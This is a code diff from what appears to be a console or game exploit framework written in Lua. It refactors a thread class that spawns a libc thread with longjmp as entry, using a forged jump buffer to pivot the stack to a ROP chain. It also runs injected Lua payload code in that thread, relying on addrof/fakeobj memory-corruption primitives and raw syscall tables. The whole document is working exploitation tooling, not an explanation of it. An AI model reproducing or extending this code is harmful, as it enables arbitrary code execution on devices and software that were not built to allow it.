@@ -1,54 +1,75 @@
 
+--
+-- thread class
+--
+-- use Thrd_create from libc to start a new thread
+-- this thread is compatible with the libc functions that the game uses
+--
+
 thread = {}
 thread.__index = thread
 
 function thread.init()
-    
+
     local setjmp = fcall(libc_addrofs.setjmp)
-
-    local jmpbuf_backup = memory.alloc(0x60)
-
-    setjmp(jmpbuf_backup)
     
-    local fpu_ctrl_value = memory.read_dword(jmpbuf_backup + 0x40)
-    local mxcsr_value = memory.read_dword(jmpbuf_backup + 0x44)
+    -- get existing state
+    local jmpbuf = memory.alloc(0x60)
+    setjmp(jmpbuf)
 
+    thread.fpu_ctrl_value = memory.read_dword(jmpbuf + 0x40)
+    thread.mxcsr_value = memory.read_dword(jmpbuf + 0x44)
     thread.thr_handle_addr = memory.alloc(0x8)
-    thread.jmpbuf = memory.alloc(0x60)
-
-    memory.write_qword(thread.jmpbuf, gadgets["ret"]) -- ret addr
-    memory.write_dword(thread.jmpbuf + 0x40, fpu_ctrl_value) -- fpu control word
-    memory.write_dword(thread.jmpbuf + 0x44, mxcsr_value) -- mxcsr
+    thread.initialized = true
 end
 
-function thread.run(chain)
-    
-    local Thrd_create = fcall(libc_addrofs.Thrd_create)
+function thread:new(chain)
+
+    if not thread.initialized then
+        thread.init()
+    end
+
+    if not chain.stack_base then
+        error("`chain` argument must be a ropchain() object")
+    end
     
     local self = setmetatable({}, thread)
 
     -- exit the thread after it has finished
     chain:push_fcall(libc_addrofs.Thrd_exit)
 
-    memory.write_qword(thread.jmpbuf+0x10, chain.stack_base) -- rsp - pivot to our ropchain
+    self.jmpbuf = memory.alloc(0x60)
 
-    -- create new thread with longjmp as entry, which then will jmp to our ropchain
-    local ret = Thrd_create(thread.thr_handle_addr, libc_addrofs.longjmp, thread.jmpbuf):tonumber()
+    memory.write_qword(self.jmpbuf, gadgets["ret"]) -- ret addr
+    memory.write_qword(self.jmpbuf + 0x10, chain.stack_base) -- rsp - pivot to our ropchain
+    memory.write_dword(self.jmpbuf + 0x40, thread.fpu_ctrl_value) -- fpu control word
+    memory.write_dword(self.jmpbuf + 0x44, thread.mxcsr_value) -- mxcsr
+
+    self.chain = chain
+    return self
+end
+
+function thread:run()
+
+    local Thrd_create = fcall(libc_addrofs.Thrd_create)
+    
+    -- spawn new thread with longjmp as entry, which then will jmp to our ropchain
+    local ret = Thrd_create(thread.thr_handle_addr, libc_addrofs.longjmp, self.jmpbuf):tonumber()
+    
     if ret ~= 0 then
         error("Thrd_create() error: " .. hex(ret))
     end
 
     self.thr_handle = memory.read_qword(thread.thr_handle_addr)
-    self.chain = chain
-    return self
 end
 
 function thread:join()
 
     local Thrd_join = fcall(libc_addrofs.Thrd_join)
 
-    -- will block until thread finish
+    -- will block until thread terminate
     local ret = Thrd_join(self.thr_handle, 0):tonumber()
+
     if ret ~= 0 then
         error("Thrd_join() error: " .. hex(ret))
     end
@@ -93,15 +114,9 @@ function run_lua_code_in_new_thread(lua_code, opt)
         require "native"
         require "thread"
 
-        function _deserialize(s)
-            local env = setmetatable({uint64 = uint64}, {__index = _G})
-            local f = assert(loadstring("return " .. s, "deserialize", "t", env))
-            return f()
-        end
-
         function _payload_init()
 
-            local data_from_loader = _deserialize(_data_from_loader)
+            local data_from_loader = deserialize(_data_from_loader)
 
             local syscall_tbl = data_from_loader.syscall
             data_from_loader.syscall = nil  -- dont copy to global
@@ -126,9 +141,6 @@ function run_lua_code_in_new_thread(lua_code, opt)
 
             -- enable addrof/fakeobj primitives
             lua.setup_victim_table()
-
-            -- enable ability to create thread
-            thread.init()
         end
 
         _payload_init()
@@ -221,6 +233,10 @@ function run_lua_code_in_new_thread(lua_code, opt)
         end
     end
 
-    -- run rop in new thread
-    return thread.run(chain)
+    local thr = thread:new(chain)
+
+    -- spawn lua in new thread
+    thr:run()
+
+    return thr
 end
